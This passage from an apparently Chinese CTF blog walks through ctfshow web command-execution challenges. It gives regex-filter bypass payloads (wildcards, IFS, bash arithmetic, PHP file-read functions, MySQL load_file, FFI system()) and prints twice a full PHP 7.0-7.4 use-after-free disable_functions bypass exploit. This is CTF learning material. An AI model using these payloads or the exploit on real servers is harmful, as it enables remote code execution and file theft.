    if(!preg_match(&quot;&#x2F;\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;
        system($c);
    &#125;
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>payload</p>
<pre class="language-none"><code class="language-none">?c&#x3D;&#x2F;bin&#x2F;ca?$&#123;IFS&#125;f???????</code></pre>

<p>通配符绕过</p>
<h2 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php

if(isset($_GET[&#39;c&#39;]))&#123;
    $c&#x3D;$_GET[&#39;c&#39;];
    if(!preg_match(&quot;&#x2F;\;|[a-z]|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;
        system($c);
    &#125;
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>payload1</p>
<p>利用base64命令和通配符</p>
<pre class="language-none"><code class="language-none">c&#x3D;&#x2F;???&#x2F;????64 ????.???</code></pre>

<p>payload2</p>
<p>p牛是真的厉害</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=1#reply-list">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=1#reply-list</a></p>
<p>直接利用p牛博客里的这个</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430174531949.png" alt="image-20220430174531949"></p>
<p>然后cat flag.php</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430174552316.png" alt="image-20220430174552316"></p>
<p>有几率不成功，因为临时文件的文件名是随机的，如果没成功就是没大写，多试几次就行了</p>
<h2 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430175025474.png" alt="image-20220430175025474"></p>
<p>另外这里如果是eval函数，那执行时还要加上?&gt;&lt;?=</p>
<p>payload为</p>
<pre class="language-php" data-language="php"><code class="language-php">?&gt;&lt;?&#x3D;&#96;. &#x2F;???&#x2F;????????[@-[]&#96;;?&gt;</code></pre>

<p>  原因是eval()函数相当于执行php的代码，而&lt;?= 就相当于&lt;?php echo<code> </code>在PHP7以上不管short_open_tag配置是不是开启的。都可以使用。所以就相当于一个新的PHP文件，这样的话就需要将最开始前面的&lt;?php给闭合，不然不会执行。</p>
<h2 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
&#x2F;&#x2F; 还能炫的动吗？
&#x2F;&#x2F;flag in 36.php
if(isset($_GET[&#39;c&#39;]))&#123;
    $c&#x3D;$_GET[&#39;c&#39;];
    if(!preg_match(&quot;&#x2F;\;|[a-z]|[0-9]|\&#96;|\|\#|\&#39;|\&quot;|\&#96;|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\&#x3D;|\[&#x2F;i&quot;, $c))&#123;
        system(&quot;cat &quot;.$c.&quot;.php&quot;);
    &#125;
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p><code>$&#123;_&#125;</code>:代表上一次命令执行的结果<br><code>$(())</code>: 做运算</p>
<p>之前没有命令返回或者执行,结果应该是空,与<code>&quot;&quot;</code>等价<br>又 <code>$((&quot;&quot;))</code>值为0,<code>$((~$((&quot;&quot;))))</code>值为-1,再做拼接:</p>
<p>payload</p>
<pre class="language-none"><code class="language-none">$((~$(($((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))))))</code></pre>

<h2 id="web58-65"><a href="#web58-65" class="headerlink" title="web58-65"></a>web58-65</h2><p>有一堆禁用函数</p>
<p>print_r(scandir(&#39;.&#39;));或者print_r(glob(&quot;*&quot;));读目录</p>
<table>
<thead>
<tr>
<th></th>
<th>扫目录找flag位置</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td>print_r(scandir(&#39;./&#39;));</td>
</tr>
<tr>
<td></td>
<td>$a=opendir(&#39;./&#39;);while(($file = readdir($a)) !=false){echo $file.&quot; &quot;;}</td>
</tr>
<tr>
<td></td>
<td>var_dump(scandir(&quot;/&quot;));</td>
</tr>
<tr>
<td></td>
<td>$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f){echo($f-&gt;__toString().&quot; &quot;);}</td>
</tr>
</tbody></table>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430181502718.png" alt="image-20220430181502718"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430182020777.png" alt="image-20220430182020777"></p>
<p>c=print_r(file_get_contents(&#39;flag.php&#39;));或者readfile或者show_source或者highlight_file读文件</p>
<p>还可以更骚一点</p>
<p>POST c=include($_GET[&#39;url&#39;]); </p>
<p>GET /?url=php://filter/read=convert.base64-encode/resource=flag.php</p>
<p>附一点读文件的方式</p>
<pre class="language-php" data-language="php"><code class="language-php">highlight_file($filename);
show_source($filename);
print_r(php_strip_whitespace($filename));
print_r(file_get_contents($filename));
readfile($filename);
print_r(file($filename)); &#x2F;&#x2F; var_dump
fread(fopen($filename,&quot;r&quot;), $size);&#x2F;&#x2F;print_r(fread(fopen(&quot;flag.php&quot;,&quot;r&quot;), filesize(&quot;flag.php&quot;)));
include($filename); &#x2F;&#x2F; 非php代码
include_once($filename); &#x2F;&#x2F; 非php代码
require($filename); &#x2F;&#x2F; 非php代码
require_once($filename); &#x2F;&#x2F; 非php代码  伪协议读源码
print_r(fread(popen(&quot;cat flag&quot;, &quot;r&quot;), $size));
print_r(fgets(fopen($filename, &quot;r&quot;))); &#x2F;&#x2F; 读取一行$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line &#x3D;    fgets($a);echo $line;&#125;
fpassthru(fopen($filename, &quot;r&quot;)); &#x2F;&#x2F; 从当前位置一直读取到 EOF
print_r(fgetcsv(fopen($filename,&quot;r&quot;), $size));&#x2F;&#x2F;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line &#x3D; fgetcsv($a);var_dump($line);&#125;
print_r(fgetss(fopen($filename, &quot;r&quot;))); &#x2F;&#x2F; 从文件指针中读取一行并过滤掉 HTML 标记
print_r(fscanf(fopen(&quot;flag&quot;, &quot;r&quot;),&quot;%s&quot;));&#x2F;&#x2F;c&#x3D;$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;print_r(fscanf($a,&quot;%s&quot;));&#125;;
print_r(parse_ini_file($filename)); &#x2F;&#x2F; 失败时返回 false , 成功返回配置数组</code></pre>

<p><strong>web59</strong></p>
<p>file_get_contents和readfile没了，可以用其他俩</p>
<p><strong>web60-65</strong></p>
<p>同web58，差不多就那几个函数，用show_source能全过</p>
<h2 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h2><pre class="language-none"><code class="language-none">c&#x3D;print_r(scandir(&#39;&#x2F;&#39;));highlight_file(&quot;&#x2F;flag.txt&quot;);</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430204318885.png" alt="image-20220430204318885"></p>
<h2 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h2><p>print_r禁了</p>
<p>用var_dump</p>
<pre class="language-none"><code class="language-none">c&#x3D;var_dump(scandir(&#39;&#x2F;&#39;));highlight_file(&quot;&#x2F;flag.txt&quot;);</code></pre>

<h2 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h2><pre class="language-none"><code class="language-none">c&#x3D;var_dump(scandir(&#39;&#x2F;&#39;));include(&quot;&#x2F;flag.txt&quot;)</code></pre>

<p>看根目录，然后直接include包含</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430211411455.png" alt="image-20220430211411455"></p>
<h2 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h2><p>var_dump也没了，但是还有var_export</p>
<pre class="language-php" data-language="php"><code class="language-php">c&#x3D;var_export(scandir(&#39;&#x2F;&#39;));include(&quot;&#x2F;flag.txt&quot;);</code></pre>

<p>y4师傅还有一个用php的原生类遍历目录的骚操作</p>
<pre class="language-none"><code class="language-none">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;</code></pre>

<p>然后包含这个我文件</p>
<pre class="language-none"><code class="language-none">c&#x3D;include(&#39;&#x2F;flag.txt&#39;);
c&#x3D;require(&#39;&#x2F;flag.txt&#39;);
c&#x3D;require_once(&#39;&#x2F;flag.txt&#39;);</code></pre>

<h2 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h2><p>同69</p>
<h2 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h2><pre class="language-none"><code class="language-none">&lt;?php

error_reporting(0);
ini_set(&#39;display_errors&#39;, 0);
&#x2F;&#x2F; 你们在炫技吗？
if(isset($_POST[&#39;c&#39;]))&#123;
        $c&#x3D; $_POST[&#39;c&#39;];
        eval($c);
        $s &#x3D; ob_get_contents();
        ob_end_clean();
        echo preg_replace(&quot;&#x2F;[0-9]|[a-z]&#x2F;i&quot;,&quot;?&quot;,$s);
&#125;else&#123;
    highlight_file(__FILE__);
&#125;
?&gt;


</code></pre>

<p>ob_get_contents — 返回输出缓冲区的内容<br>ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲</p>
<blockquote>
<p>此函数丢弃最顶层输出缓冲区的内容并关闭这个缓冲区。如果想要进一步处理缓冲区的内容，必须在ob_end_clean()之前调用ob_get_contents()，因为当调用ob_end_clean()时缓冲区内容将被丢弃</p>
</blockquote>
<p>要用<code>exit();</code>使程序提前退出，绕过后面的正则表达式</p>
<pre class="language-php" data-language="php"><code class="language-php">c&#x3D;var_export(scandir(&#39;&#x2F;&#39;));include(&quot;&#x2F;flag.txt&quot;);exit();</code></pre>



<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430220313035.png" alt="image-20220430220313035"></p>
<h2 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h2><p>scandir被禁用了</p>
<p>用y4师傅的那个原生类来查目录，但是文件没有权限被包含</p>
<p>y4师傅推荐的脚本</p>
<pre class="language-none"><code class="language-none">&lt;?php

# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)
#
# Bug: https:&#x2F;&#x2F;bugs.php.net&#x2F;bug.php?id&#x3D;76047
# debug_backtrace() returns a reference to a variable 
# that has been destroyed, causing a UAF vulnerability.
#
# This exploit should work on all PHP 7.0-7.4 versions
# released as of 30&#x2F;01&#x2F;2020.
#
# Author: https:&#x2F;&#x2F;github.com&#x2F;mm0r1

pwn(&quot;uname -a&quot;);

function pwn($cmd) &#123;
    global $abc, $helper, $backtrace;

    class Vuln &#123;
        public $a;
        public function __destruct() &#123; 
            global $backtrace; 
            unset($this-&gt;a);
            $backtrace &#x3D; (new Exception)-&gt;getTrace(); # ;)
            if(!isset($backtrace[1][&#39;args&#39;])) &#123; # PHP &gt;&#x3D; 7.4
                $backtrace &#x3D; debug_backtrace();
            &#125;
        &#125;
    &#125;

    class Helper &#123;
        public $a, $b, $c, $d;
    &#125;

    function str2ptr(&amp;$str, $p &#x3D; 0, $s &#x3D; 8) &#123;
        $address &#x3D; 0;
        for($j &#x3D; $s-1; $j &gt;&#x3D; 0; $j--) &#123;
            $address &lt;&lt;&#x3D; 8;
            $address |&#x3D; ord($str[$p+$j]);
        &#125;
        return $address;
    &#125;

    function ptr2str($ptr, $m &#x3D; 8) &#123;
        $out &#x3D; &quot;&quot;;
        for ($i&#x3D;0; $i &lt; $m; $i++) &#123;
            $out .&#x3D; chr($ptr &amp; 0xff);
            $ptr &gt;&gt;&#x3D; 8;
        &#125;
        return $out;
    &#125;

    function write(&amp;$str, $p, $v, $n &#x3D; 8) &#123;
        $i &#x3D; 0;
        for($i &#x3D; 0; $i &lt; $n; $i++) &#123;
            $str[$p + $i] &#x3D; chr($v &amp; 0xff);
            $v &gt;&gt;&#x3D; 8;
        &#125;
    &#125;

    function leak($addr, $p &#x3D; 0, $s &#x3D; 8) &#123;
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak &#x3D; strlen($helper-&gt;a);
        if($s !&#x3D; 8) &#123; $leak %&#x3D; 2 &lt;&lt; ($s * 8) - 1; &#125;
        return $leak;
    &#125;

    function parse_elf($base) &#123;
        $e_type &#x3D; leak($base, 0x10, 2);

        $e_phoff &#x3D; leak($base, 0x20);
        $e_phentsize &#x3D; leak($base, 0x36, 2);
        $e_phnum &#x3D; leak($base, 0x38, 2);

        for($i &#x3D; 0; $i &lt; $e_phnum; $i++) &#123;
            $header &#x3D; $base + $e_phoff + $i * $e_phentsize;
            $p_type  &#x3D; leak($header, 0, 4);
            $p_flags &#x3D; leak($header, 4, 4);
            $p_vaddr &#x3D; leak($header, 0x10);
            $p_memsz &#x3D; leak($header, 0x28);

            if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 6) &#123; # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr &#x3D; $e_type &#x3D;&#x3D; 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size &#x3D; $p_memsz;
            &#125; else if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 5) &#123; # PT_LOAD, PF_Read_exec
                $text_size &#x3D; $p_memsz;
            &#125;
        &#125;

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    &#125;

    function get_basic_funcs($base, $elf) &#123;
        list($data_addr, $text_size, $data_size) &#x3D; $elf;
        for($i &#x3D; 0; $i &lt; $data_size &#x2F; 8; $i++) &#123;
            $leak &#x3D; leak($data_addr, $i * 8);
            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;
                $deref &#x3D; leak($leak);
                # &#39;constant&#39; constant check
                if($deref !&#x3D; 0x746e6174736e6f63)
                    continue;
            &#125; else continue;

            $leak &#x3D; leak($data_addr, ($i + 4) * 8);
            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;
                $deref &#x3D; leak($leak);
                # &#39;bin2hex&#39; constant check
                if($deref !&#x3D; 0x786568326e6962)
                    continue;
            &#125; else continue;

            return $data_addr + $i * 8;
        &#125;
    &#125;

    function get_binary_base($binary_leak) &#123;
        $base &#x3D; 0;
        $start &#x3D; $binary_leak &amp; 0xfffffffffffff000;
        for($i &#x3D; 0; $i &lt; 0x1000; $i++) &#123;
            $addr &#x3D; $start - 0x1000 * $i;
            $leak &#x3D; leak($addr, 0, 7);
            if($leak &#x3D;&#x3D; 0x10102464c457f) &#123; # ELF header
                return $addr;
            &#125;
        &#125;
    &#125;

    function get_system($basic_funcs) &#123;
        $addr &#x3D; $basic_funcs;
        do &#123;
            $f_entry &#x3D; leak($addr);
            $f_name &#x3D; leak($f_entry, 0, 6);

            if($f_name &#x3D;&#x3D; 0x6d6574737973) &#123; # system
                return leak($addr + 8);
            &#125;
            $addr +&#x3D; 0x20;
        &#125; while($f_entry !&#x3D; 0);
        return false;
    &#125;

    function trigger_uaf($arg) &#123;
        # str_shuffle prevents opcache string interning
        $arg &#x3D; str_shuffle(str_repeat(&#39;A&#39;, 79));
        $vuln &#x3D; new Vuln();
        $vuln-&gt;a &#x3D; $arg;
    &#125;

    if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;
        die(&#39;This PoC is for *nix systems only.&#39;);
    &#125;

    $n_alloc &#x3D; 10; # increase this value if UAF fails
    $contiguous &#x3D; [];
    for($i &#x3D; 0; $i &lt; $n_alloc; $i++)
        $contiguous[] &#x3D; str_shuffle(str_repeat(&#39;A&#39;, 79));

    trigger_uaf(&#39;x&#39;);
    $abc &#x3D; $backtrace[1][&#39;args&#39;][0];

    $helper &#x3D; new Helper;
    $helper-&gt;b &#x3D; function ($x) &#123; &#125;;

    if(strlen($abc) &#x3D;&#x3D; 79 || strlen($abc) &#x3D;&#x3D; 0) &#123;
        die(&quot;UAF failed&quot;);
    &#125;

    # leaks
    $closure_handlers &#x3D; str2ptr($abc, 0);
    $php_heap &#x3D; str2ptr($abc, 0x58);
    $abc_addr &#x3D; $php_heap - 0xc8;

    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj &#x3D; str2ptr($abc, 0x20);

    $binary_leak &#x3D; leak($closure_handlers, 8);
    if(!($base &#x3D; get_binary_base($binary_leak))) &#123;
        die(&quot;Couldn&#39;t determine binary base address&quot;);
    &#125;

    if(!($elf &#x3D; parse_elf($base))) &#123;
        die(&quot;Couldn&#39;t parse ELF header&quot;);
    &#125;

    if(!($basic_funcs &#x3D; get_basic_funcs($base, $elf))) &#123;
        die(&quot;Couldn&#39;t get basic_functions address&quot;);
    &#125;

    if(!($zif_system &#x3D; get_system($basic_funcs))) &#123;
        die(&quot;Couldn&#39;t get zif_system address&quot;);
    &#125;

    # fake closure object
    $fake_obj_offset &#x3D; 0xd0;
    for($i &#x3D; 0; $i &lt; 0x110; $i +&#x3D; 8) &#123;
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    &#125;

    # pwn
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler

    ($helper-&gt;b)($cmd);
    exit();
&#125;
pwn(&quot;cat &#x2F;flag0.txt&quot;);ob_end_flush();</code></pre>

<p>//上边这个脚本过不了的原因是题目环境禁用了str_repeat，所以手动重复79个A就行了</p>
<p>群主给的</p>
<pre class="language-none"><code class="language-none">c&#x3D;function ctfshow($cmd) &#123;
    global $abc, $helper, $backtrace;

    class Vuln &#123;
        public $a;
        public function __destruct() &#123; 
            global $backtrace; 
            unset($this-&gt;a);
            $backtrace &#x3D; (new Exception)-&gt;getTrace();
            if(!isset($backtrace[1][&#39;args&#39;])) &#123;
                $backtrace &#x3D; debug_backtrace();
            &#125;
        &#125;
    &#125;

    class Helper &#123;
        public $a, $b, $c, $d;
    &#125;

    function str2ptr(&amp;$str, $p &#x3D; 0, $s &#x3D; 8) &#123;
        $address &#x3D; 0;
        for($j &#x3D; $s-1; $j &gt;&#x3D; 0; $j--) &#123;
            $address &lt;&lt;&#x3D; 8;
            $address |&#x3D; ord($str[$p+$j]);
        &#125;
        return $address;
    &#125;

    function ptr2str($ptr, $m &#x3D; 8) &#123;
        $out &#x3D; &quot;&quot;;
        for ($i&#x3D;0; $i &lt; $m; $i++) &#123;
            $out .&#x3D; sprintf(&quot;%c&quot;,($ptr &amp; 0xff));
            $ptr &gt;&gt;&#x3D; 8;
        &#125;
        return $out;
    &#125;

    function write(&amp;$str, $p, $v, $n &#x3D; 8) &#123;
        $i &#x3D; 0;
        for($i &#x3D; 0; $i &lt; $n; $i++) &#123;
            $str[$p + $i] &#x3D; sprintf(&quot;%c&quot;,($v &amp; 0xff));
            $v &gt;&gt;&#x3D; 8;
        &#125;
    &#125;

    function leak($addr, $p &#x3D; 0, $s &#x3D; 8) &#123;
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak &#x3D; strlen($helper-&gt;a);
        if($s !&#x3D; 8) &#123; $leak %&#x3D; 2 &lt;&lt; ($s * 8) - 1; &#125;
        return $leak;
    &#125;

    function parse_elf($base) &#123;
        $e_type &#x3D; leak($base, 0x10, 2);

        $e_phoff &#x3D; leak($base, 0x20);
        $e_phentsize &#x3D; leak($base, 0x36, 2);
        $e_phnum &#x3D; leak($base, 0x38, 2);

        for($i &#x3D; 0; $i &lt; $e_phnum; $i++) &#123;
            $header &#x3D; $base + $e_phoff + $i * $e_phentsize;
            $p_type  &#x3D; leak($header, 0, 4);
            $p_flags &#x3D; leak($header, 4, 4);
            $p_vaddr &#x3D; leak($header, 0x10);
            $p_memsz &#x3D; leak($header, 0x28);

            if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 6) &#123; 

                $data_addr &#x3D; $e_type &#x3D;&#x3D; 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size &#x3D; $p_memsz;
            &#125; else if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 5) &#123; 
                $text_size &#x3D; $p_memsz;
            &#125;
        &#125;

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    &#125;

    function get_basic_funcs($base, $elf) &#123;
        list($data_addr, $text_size, $data_size) &#x3D; $elf;
        for($i &#x3D; 0; $i &lt; $data_size &#x2F; 8; $i++) &#123;
            $leak &#x3D; leak($data_addr, $i * 8);
            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;
                $deref &#x3D; leak($leak);
                
                if($deref !&#x3D; 0x746e6174736e6f63)
                    continue;
            &#125; else continue;

            $leak &#x3D; leak($data_addr, ($i + 4) * 8);
            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;
                $deref &#x3D; leak($leak);
                
                if($deref !&#x3D; 0x786568326e6962)
                    continue;
            &#125; else continue;

            return $data_addr + $i * 8;
        &#125;
    &#125;

    function get_binary_base($binary_leak) &#123;
        $base &#x3D; 0;
        $start &#x3D; $binary_leak &amp; 0xfffffffffffff000;
        for($i &#x3D; 0; $i &lt; 0x1000; $i++) &#123;
            $addr &#x3D; $start - 0x1000 * $i;
            $leak &#x3D; leak($addr, 0, 7);
            if($leak &#x3D;&#x3D; 0x10102464c457f) &#123;
                return $addr;
            &#125;
        &#125;
    &#125;

    function get_system($basic_funcs) &#123;
        $addr &#x3D; $basic_funcs;
        do &#123;
            $f_entry &#x3D; leak($addr);
            $f_name &#x3D; leak($f_entry, 0, 6);

            if($f_name &#x3D;&#x3D; 0x6d6574737973) &#123;
                return leak($addr + 8);
            &#125;
            $addr +&#x3D; 0x20;
        &#125; while($f_entry !&#x3D; 0);
        return false;
    &#125;

    function trigger_uaf($arg) &#123;

        $arg &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);
        $vuln &#x3D; new Vuln();
        $vuln-&gt;a &#x3D; $arg;
    &#125;

    if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;
        die(&#39;This PoC is for *nix systems only.&#39;);
    &#125;

    $n_alloc &#x3D; 10; 
    $contiguous &#x3D; [];
    for($i &#x3D; 0; $i &lt; $n_alloc; $i++)
        $contiguous[] &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);

    trigger_uaf(&#39;x&#39;);
    $abc &#x3D; $backtrace[1][&#39;args&#39;][0];

    $helper &#x3D; new Helper;
    $helper-&gt;b &#x3D; function ($x) &#123; &#125;;

    if(strlen($abc) &#x3D;&#x3D; 79 || strlen($abc) &#x3D;&#x3D; 0) &#123;
        die(&quot;UAF failed&quot;);
    &#125;

    $closure_handlers &#x3D; str2ptr($abc, 0);
    $php_heap &#x3D; str2ptr($abc, 0x58);
    $abc_addr &#x3D; $php_heap - 0xc8;

    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj &#x3D; str2ptr($abc, 0x20);

    $binary_leak &#x3D; leak($closure_handlers, 8);
    if(!($base &#x3D; get_binary_base($binary_leak))) &#123;
        die(&quot;Couldn&#39;t determine binary base address&quot;);
    &#125;

    if(!($elf &#x3D; parse_elf($base))) &#123;
        die(&quot;Couldn&#39;t parse ELF header&quot;);
    &#125;

    if(!($basic_funcs &#x3D; get_basic_funcs($base, $elf))) &#123;
        die(&quot;Couldn&#39;t get basic_functions address&quot;);
    &#125;

    if(!($zif_system &#x3D; get_system($basic_funcs))) &#123;
        die(&quot;Couldn&#39;t get zif_system address&quot;);
    &#125;


    $fake_obj_offset &#x3D; 0xd0;
    for($i &#x3D; 0; $i &lt; 0x110; $i +&#x3D; 8) &#123;
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    &#125;

    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); 
    write($abc, 0xd0 + 0x68, $zif_system); 

    ($helper-&gt;b)($cmd);
    exit();
&#125;

ctfshow(&quot;cat &#x2F;flag0.txt&quot;);ob_end_flush();
#需要通过url编码哦
</code></pre>

<h2 id="web73-74"><a href="#web73-74" class="headerlink" title="web73-74"></a>web73-74</h2><pre class="language-none"><code class="language-none">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;include(&#39;&#x2F;flagc.txt&#39;);exit();</code></pre>

<h2 id="Web75-76"><a href="#Web75-76" class="headerlink" title="Web75-76"></a>Web75-76</h2><p>读目录，发现flag36.txt，但是不能包含，uaf失败</p>
<p>用mysql的load_file读取文件</p>
<pre class="language-none"><code class="language-none">c&#x3D;try &#123;$dbh &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;ctftraining&#39;, &#39;root&#39;,
&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;&#x2F;flag36.txt&quot;)&#39;) as $row)
&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh &#x3D; null;&#125;catch (PDOException $e) &#123;echo $e-getMessage();exit(0);&#125;exit(0);</code></pre>

<p>感觉。。。正常应该是不会这样的 ，没用户名和密码怎么读</p>
<h2 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h2><p>利用FFI，php7.4以上才有</p>
<pre class="language-none"><code class="language-none">$ffi &#x3D; FFI::cdef(&quot;int system(const char *command);&quot;);&#x2F;&#x2F;创建一个system对象
$a&#x3D;&#39;&#x2F;readflag &gt; 1.txt&#39;;&#x2F;&#x2F;没有回显的
这里因为不能回显，所以利用重定向将readflag内容输出到其他地方
$ffi-&gt;system($a);&#x2F;&#x2F;通过$ffi去调用system函数</code></pre>

<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ffi.cdef.php">https://www.php.net/manual/zh/ffi.cdef.php</a></p>
<p><a target="_blank" rel="noopener" href="https://www.php.cn/php-weizijiaocheng-415807.html">https://www.php.cn/php-weizijiaocheng-415807.html</a></p>
<p>实话实话没太看懂</p>
<pre class="language-none"><code class="language-none">c&#x3D;$ffi&#x3D;FFI::cdef(&quot;int system(char *command);&quot;, &quot;libc.so.6&quot;);$a&#x3D;&#39;&#x2F;readflag &gt; 1.txt&#39;;$ffi-&gt;system($a);exit();  </code></pre>

<p>打完payload访问一下1.txt就能拿到flag</p>
<p>后边的题感觉有点玄幻了，就单纯的记一下方法</p>
<h2 id="web118"><a href="#web118" class="headerlink" title="web118"></a>web118</h2><p> 源码里有system($code);但是有waf</p>
<pre class="language-none"><code class="language-none">!preg_match(&#39;&#x2F;\x09|\x0a|[a-z]|[0-9]|\&#x2F;|\(|\)|\[|\]|\\\\|\+|\-|\!|\&#x3D;|\^|\*|\x26|\%|\&lt;|\&gt;|\&#39;|\&quot;|\&#96;|\||\,&#x2F;&#39;</code></pre>

<p>利用bash内置变量来rce</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430231046010.png" alt="image-20220430231046010"></p>
<pre class="language-none"><code class="language-none">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$IFS????.???</code></pre>

<pre class="language-none"><code class="language-none"># echo $&#123;PWD&#125; 
